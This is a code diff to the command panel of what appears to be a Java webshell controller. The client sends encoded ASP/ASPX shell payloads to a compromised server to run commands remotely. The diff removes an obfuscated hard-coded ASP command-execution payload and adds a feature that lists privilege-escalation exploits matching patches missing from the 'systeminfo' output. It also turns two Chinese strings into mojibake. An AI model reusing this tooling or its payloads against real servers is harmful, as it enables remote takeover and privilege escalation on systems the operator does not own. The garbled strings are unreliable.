@@ -7,6 +7,10 @@ import java.awt.event.KeyAdapter;
 import java.awt.event.KeyEvent;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
+import java.io.BufferedReader;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.lang.reflect.InvocationTargetException;
 import java.net.URLEncoder;
 import java.util.Map;
@@ -18,6 +22,7 @@ import javax.swing.text.BadLocationException;
 
 import com.mypack.util.AnalysisClass;
 import com.mypack.util.Base64;
+import com.mypack.util.FileIO;
 import com.mypack.util.HttpClass;
 
 public class CMDPanel extends JPanel {
@@ -44,7 +49,7 @@ public class CMDPanel extends JPanel {
 	private int len ;
 	private String path;
 	private String execTool;
-	public CMDPanel(String id, String url, String password, String scriptType, Main main) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
+	public CMDPanel(String id, String url, String password, String scriptType, Main main) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException {
 		this.id = id;
 		this.url = url;
 		this.password = password;
@@ -81,7 +86,7 @@ public class CMDPanel extends JPanel {
 			}
 		});
 		
-		textArea.setFont(new Font("宋体", Font.BOLD, 20));
+		textArea.setFont(new Font("瀹嬩綋", Font.BOLD, 20));
 		textArea.addKeyListener(new KeyAdapter() {
 			@Override
 			public void keyPressed(KeyEvent arg0) {
@@ -129,7 +134,7 @@ public class CMDPanel extends JPanel {
 			execCmd("uname -a");
 		}
 	}
-	public void execCmd(String cmd) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException{
+	public void execCmd(String cmd) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException{
 		postText="";
 		temp = "";
 		if(execTool.equals("cmd")){
@@ -144,8 +149,6 @@ public class CMDPanel extends JPanel {
 			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE");
 			postText = postText.replace("PAYLOAD", Base64.str2HexStr(payload.get(scriptType.toUpperCase()+"_SHELL").replace("PARAM1", payload.get("PARAM1")).replace("PARAM2", payload.get("PARAM2"))));
 			postText = postText+"&"+payload.get("PARAM1")+"="+Base64.str2HexStr(execTool)+"&"+payload.get("PARAM2")+"="+Base64.str2HexStr(temp);
-//			System.out.println(execTool);
-//			postText = "v=Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420583d4372656174654f626a6563742822777363726970742e7368656c6c22292e657865632822222222266264285265717565737428227a3122292926222222202f6320222222266264285265717565737428227a322229292622222222293a496620457272205468656e3a533d225b4572725d2022264572722e4465736372697074696f6e3a4572722e436c6561723a456c73653a4f3d582e5374644f75742e52656164416c6c28293a453d582e5374644572722e52656164416c6c28293a533d4f26453a456e642049663a526573706f6e73652e7772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=636d64&z2=6364202f642022453a5c7777775c2226766172266563686f205b535d266364266563686f205b455d";
 }
 		if(scriptType.toUpperCase().equals("ASPX")){
 			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE");
@@ -153,8 +156,18 @@ public class CMDPanel extends JPanel {
 			postText = postText+"&"+payload.get("PARAM1")+"="+execTool+"&"+payload.get("PARAM2")+"="+URLEncoder.encode(temp);
 		}
 		String   respond = http.postSend(url, postText);
-		String resule = respond.substring(respond.indexOf(payload.get("SPL"))+1, respond.indexOf("[S]")); //回显容易被截取出错
+		String resule = respond.substring(respond.indexOf(payload.get("SPL"))+1, respond.indexOf("[S]")); //鍥炴樉瀹规槗琚埅鍙栧嚭閿�
 		textArea.append(resule);
+		if(cmd.equals("systeminfo")){
+			BufferedReader br = new BufferedReader(new InputStreamReader(this.getClass().getResourceAsStream(("/res/buding.txt"))));
+			String temp ;
+			textArea.append("可提权的exp\r\n");
+			while((temp=br.readLine())!=null){
+				if(resule.indexOf(temp.split(" ")[0])==-1){
+					textArea.append(temp+"\r\n");
+				}
+			}
+		}
 		path =respond.substring(respond.indexOf("[S]")+3,respond.indexOf("[E]")).trim()+"/";
 		//textArea.append(execTool.equals("cmd")?path.trim()+"\\":path.trim());
 		textArea.append(path);
